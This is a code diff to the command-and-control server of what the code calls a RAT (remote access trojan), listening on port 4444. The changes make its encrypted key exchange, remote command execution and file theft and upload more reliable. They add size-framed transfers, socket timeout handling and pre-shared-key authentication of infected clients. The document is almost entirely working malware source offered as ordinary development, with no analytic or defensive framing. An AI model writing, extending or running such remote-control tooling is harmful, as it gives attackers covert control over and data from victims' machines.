@@ -29,6 +29,7 @@
 #include <sys/stat.h>
 
 #include "../include/crypto.h"
+#include "../include/util.h"
 
 #define PORT 4444
 #define BUFFER_SIZE 4096
@@ -89,19 +90,19 @@ int perform_key_exchange(RAT_SERVER *server) {
     
     // Send our public key length and key
     uint32_t key_len_net = htonl(our_key_len);
-    if (send(server->client_fd, &key_len_net, sizeof(key_len_net), 0) != sizeof(key_len_net)) {
+    if (send_all(server->client_fd, &key_len_net, sizeof(key_len_net), 0) != 0) {
         printf("Error: Failed to send public key length\n");
         goto cleanup;
     }
     
-    if (send(server->client_fd, our_public_key, our_key_len, 0) != our_key_len) {
+    if (send_all(server->client_fd, our_public_key, our_key_len, 0) != 0) {
         printf("Error: Failed to send public key\n");
         goto cleanup;
     }
     
     // Receive peer's public key length
     uint32_t peer_key_len_net;
-    if (recv(server->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != sizeof(peer_key_len_net)) {
+    if (recv_all(server->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != 0) {
         printf("Error: Failed to receive peer public key length\n");
         goto cleanup;
     }
@@ -119,7 +120,7 @@ int perform_key_exchange(RAT_SERVER *server) {
         goto cleanup;
     }
     
-    if (recv(server->client_fd, peer_public_key, peer_key_len, 0) != peer_key_len) {
+    if (recv_all(server->client_fd, peer_public_key, peer_key_len, 0) != 0) {
         printf("Error: Failed to receive peer public key\n");
         goto cleanup;
     }
@@ -144,12 +145,12 @@ int perform_key_exchange(RAT_SERVER *server) {
     
     // Send encrypted AES key length and key
     uint32_t enc_key_len_net = htonl(encrypted_key_len);
-    if (send(server->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != sizeof(enc_key_len_net)) {
+    if (send_all(server->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != 0) {
         printf("Error: Failed to send encrypted key length\n");
         goto cleanup;
     }
     
-    if (send(server->client_fd, encrypted_aes_key, encrypted_key_len, 0) != encrypted_key_len) {
+    if (send_all(server->client_fd, encrypted_aes_key, encrypted_key_len, 0) != 0) {
         printf("Error: Failed to send encrypted AES key\n");
         goto cleanup;
     }
@@ -246,6 +247,18 @@ int accept_client(RAT_SERVER *server) {
         return -1;
     }
     
+    // PSK authentication (if configured) — happens before crypto init on raw TCP
+    if (server->crypto_ctx.psk_hash[0] != 0) {
+        if (crypto_send_psk_challenge(server->client_fd, &server->crypto_ctx, 0) != 0 ||
+            crypto_recv_psk_challenge(server->client_fd, &server->crypto_ctx, 0) != 0) {
+            printf("[!] PSK authentication failed — client rejected\n");
+            close(server->client_fd);
+            server->client_fd = INVALID_SOCKET;
+            return -1;
+        }
+        printf("[*] PSK authentication successful\n");
+    }
+    
     // Initialize crypto context for server
     if (crypto_init(&server->crypto_ctx, 1) != 0) {
         printf("Error: Failed to initialize encryption\n");
@@ -324,19 +337,21 @@ void receive_response(RAT_SERVER *server) {
         return;
     }
     
-    // Set socket to non-blocking temporarily to handle timeouts
+    // Save original timeout, set 1s timeout for reading, then restore
 #ifdef _WIN32
-    DWORD timeout = 1000; // 1 second timeout in milliseconds
-    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) != 0) {
-        printf("Warning: Failed to set socket timeout (WSA Error: %d)\n", WSAGetLastError());
-    }
+    DWORD orig_timeout = 0;
+    int orig_len = sizeof(orig_timeout);
+    getsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&orig_timeout, &orig_len);
+    DWORD timeout = 1000;
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
 #else
+    struct timeval orig_timeout;
+    socklen_t orig_len = sizeof(orig_timeout);
+    getsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &orig_timeout, &orig_len);
     struct timeval timeout;
-    timeout.tv_sec = 1;  // 1 second timeout
+    timeout.tv_sec = 1;
     timeout.tv_usec = 0;
-    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) != 0) {
-        perror("Warning: Failed to set socket timeout");
-    }
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
 #endif
     
     while (total_received < max_response_size) {
@@ -371,7 +386,6 @@ void receive_response(RAT_SERVER *server) {
 #ifdef _WIN32
             int error = WSAGetLastError();
             if (error == WSAETIMEDOUT) {
-                // Timeout is expected for end of response
                 break;
             } else {
                 printf("Error receiving data from client (WSA Error: %d)\n", error);
@@ -380,7 +394,6 @@ void receive_response(RAT_SERVER *server) {
             }
 #else
             if (errno == EAGAIN || errno == EWOULDBLOCK) {
-                // Timeout is expected for end of response
                 break;
             } else {
                 perror("Error receiving data from client");
@@ -391,18 +404,11 @@ void receive_response(RAT_SERVER *server) {
         }
     }
     
-    // Reset socket to blocking mode
+    // Restore original timeout
 #ifdef _WIN32
-    timeout = 0;
-    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) != 0) {
-        printf("Warning: Failed to reset socket timeout (WSA Error: %d)\n", WSAGetLastError());
-    }
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&orig_timeout, sizeof(orig_timeout));
 #else
-    timeout.tv_sec = 0;
-    timeout.tv_usec = 0;
-    if (setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) != 0) {
-        perror("Warning: Failed to reset socket timeout");
-    }
+    setsockopt(server->client_fd, SOL_SOCKET, SO_RCVTIMEO, &orig_timeout, sizeof(orig_timeout));
 #endif
     
     if (total_received > 0) {
@@ -438,19 +444,7 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
         struct stat st;
         if (stat(local_destination, &st) == 0 && S_ISDIR(st.st_mode)) {
             // Destination is a directory, append filename
-#ifdef _WIN32
-            const char *base_filename = strrchr(remote_filename, '\\');
-            if (!base_filename) {
-                base_filename = strrchr(remote_filename, '/');
-            }
-#else
-            const char *base_filename = strrchr(remote_filename, '/');
-#endif
-            if (base_filename) {
-                base_filename++; // Skip the separator
-            } else {
-                base_filename = remote_filename;
-            }
+            const char *base_filename = find_base_name(remote_filename);
 #ifdef _WIN32
             snprintf(filepath, sizeof(filepath), "%s\\%s", local_destination, base_filename);
 #else
@@ -463,19 +457,7 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
         }
     } else {
         // No destination specified, use current directory with base filename
-#ifdef _WIN32
-        const char *base_filename = strrchr(remote_filename, '\\');
-        if (!base_filename) {
-            base_filename = strrchr(remote_filename, '/');
-        }
-#else
-        const char *base_filename = strrchr(remote_filename, '/');
-#endif
-        if (base_filename) {
-            base_filename++; // Skip the separator
-        } else {
-            base_filename = remote_filename;
-        }
+        const char *base_filename = find_base_name(remote_filename);
         snprintf(filepath, sizeof(filepath), ".%c%s", 
 #ifdef _WIN32
             '\\',
@@ -485,9 +467,22 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
             base_filename);
     }
     
+    // Receive file size first
+    uint32_t fsz_hi = 0, fsz_lo = 0;
+    crypto_recv(server->client_fd, &server->crypto_ctx, &fsz_hi, sizeof(fsz_hi), 0);
+    crypto_recv(server->client_fd, &server->crypto_ctx, &fsz_lo, sizeof(fsz_lo), 0);
+    uint64_t file_remaining = ((uint64_t)ntohl(fsz_hi) << 32) | ntohl(fsz_lo);
+    
     file = fopen(filepath, "wb");
     if (!file) {
         printf("Error: Cannot create file %s - %s\n", filepath, strerror(errno));
+        // Drain remaining data
+        while (file_remaining > 0) {
+            int to_skip = (file_remaining > BUFFER_SIZE) ? BUFFER_SIZE : (int)file_remaining;
+            int skipped = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, to_skip, 0);
+            if (skipped <= 0) break;
+            file_remaining -= skipped;
+        }
         return;
     }
     
@@ -497,28 +492,24 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
     }
     printf("\n");
     
-    while ((bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, BUFFER_SIZE, 0)) > 0) {
+    // Receive exactly file_remaining bytes
+    while (file_remaining > 0) {
+        int to_read = (file_remaining > BUFFER_SIZE) ? BUFFER_SIZE : (int)file_remaining;
+        bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, to_read, 0);
+        if (bytes_received <= 0) {
+            printf("Error: Failed to receive file data\n");
+            fclose(file);
+            unlink(filepath);
+            return;
+        }
         size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
         if (bytes_written != (size_t)bytes_received) {
             printf("Error: Failed to write data to file (wrote %zu of %d bytes)\n", bytes_written, bytes_received);
             fclose(file);
-            unlink(filepath); // Remove partially written file
+            unlink(filepath);
             return;
         }
-        if (bytes_received < BUFFER_SIZE) {
-            break; // End of file
-        }
-    }
-    
-    if (bytes_received < 0) {
-#ifdef _WIN32
-        printf("Error: Failed to receive file data (WSA Error: %d)\n", WSAGetLastError());
-#else
-        perror("Error: Failed to receive file data");
-#endif
-        fclose(file);
-        unlink(filepath); // Remove partially written file
-        return;
+        file_remaining -= bytes_received;
     }
     
     if (fclose(file) != 0) {
@@ -566,19 +557,7 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
         snprintf(upload_info, sizeof(upload_info), "%s|%s\n", destination, filename);
     } else {
         // Extract just the filename for default location
-#ifdef _WIN32
-        const char *base_filename = strrchr(filename, '\\');
-        if (!base_filename) {
-            base_filename = strrchr(filename, '/');
-        }
-#else
-        const char *base_filename = strrchr(filename, '/');
-#endif
-        if (base_filename) {
-            base_filename++; // Skip the separator
-        } else {
-            base_filename = filename;
-        }
+        const char *base_filename = find_base_name(filename);
         snprintf(upload_info, sizeof(upload_info), "|%s\n", base_filename);
     }
     
@@ -606,6 +585,23 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
         return;
     }
     
+    // Get file size for EOF framing
+    struct stat file_stat;
+    if (stat(filename, &file_stat) != 0) {
+        printf("Error: Cannot stat file %s - %s\n", filename, strerror(errno));
+        fclose(file);
+        return;
+    }
+    uint64_t fsize = (uint64_t)file_stat.st_size;
+    
+    // Send file size first (two uint32_t in network order)
+    {
+        uint32_t sz_hi = htonl((uint32_t)(fsize >> 32));
+        uint32_t sz_lo = htonl((uint32_t)(fsize & 0xFFFFFFFF));
+        crypto_send(server->client_fd, &server->crypto_ctx, &sz_hi, sizeof(sz_hi), 0);
+        crypto_send(server->client_fd, &server->crypto_ctx, &sz_lo, sizeof(sz_lo), 0);
+    }
+    
     // Send file content
     while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
         bytes_sent = crypto_send(server->client_fd, &server->crypto_ctx, buffer, bytes_read, 0);
@@ -617,8 +613,6 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
 #endif
             fclose(file);
             return;
-        } else if (bytes_sent != (int)bytes_read) {
-            printf("Warning: Partial file data sent (%d of %zu bytes)\n", bytes_sent, bytes_read);
         }
     }
     
@@ -757,10 +751,10 @@ void execute_commands(RAT_SERVER *server) {
 }
 
 void cleanup(RAT_SERVER *server) {
-    if (server->client_fd > 0) {
+    if (server->client_fd != INVALID_SOCKET) {
         close(server->client_fd);
     }
-    if (server->server_fd > 0) {
+    if (server->server_fd != INVALID_SOCKET) {
         close(server->server_fd);
     }
     crypto_cleanup(&server->crypto_ctx);
@@ -777,11 +771,20 @@ void signal_handler(int sig) {
 int main() {
     RAT_SERVER server;
     
+    memset(&server.crypto_ctx, 0, sizeof(server.crypto_ctx));
+    
     // Setup signal handlers
 #ifndef _WIN32
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
 #endif
+    
+    // Pre-shared key for client authentication
+    const char *psk = getenv("RAT_PSK");
+    if (psk) {
+        crypto_set_psk(&server.crypto_ctx, psk);
+        printf("[*] PSK authentication enabled\n");
+    }
     
     // Initialize server
     strcpy(server.host, "127.0.0.1");
